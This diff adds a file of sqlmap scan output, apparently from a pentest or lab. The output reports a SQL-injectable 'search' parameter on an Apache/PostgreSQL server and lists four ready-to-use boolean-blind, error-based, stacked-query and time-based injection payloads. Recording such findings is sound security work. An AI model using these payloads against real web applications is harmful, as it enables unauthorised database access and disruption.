@@ -1,0 +1,22 @@
+sqlmap identified the following injection point(s) with a total of 34 HTTP(s) requests:
+---
+Parameter: search (GET)
+    Type: boolean-based blind
+    Title: PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)
+    Payload: search=tes' AND (SELECT (CASE WHEN (5824=5824) THEN NULL ELSE CAST((CHR(74)||CHR(71)||CHR(82)||CHR(72)) AS NUMERIC) END)) IS NULL-- mRJy
+
+    Type: error-based
+    Title: PostgreSQL AND error-based - WHERE or HAVING clause
+    Payload: search=tes' AND 4484=CAST((CHR(113)||CHR(120)||CHR(112)||CHR(113)||CHR(113))||(SELECT (CASE WHEN (4484=4484) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(113)||CHR(107)||CHR(122)||CHR(113)) AS NUMERIC)-- ebrB
+
+    Type: stacked queries
+    Title: PostgreSQL > 8.1 stacked queries (comment)
+    Payload: search=tes';SELECT PG_SLEEP(5)--
+
+    Type: time-based blind
+    Title: PostgreSQL > 8.1 AND time-based blind
+    Payload: search=tes' AND 9680=(SELECT 9680 FROM PG_SLEEP(5))-- qGHW
+---
+web server operating system: Linux Ubuntu 19.10 or 20.04 (focal or eoan)
+web application technology: Apache 2.4.41
+back-end DBMS: PostgreSQL
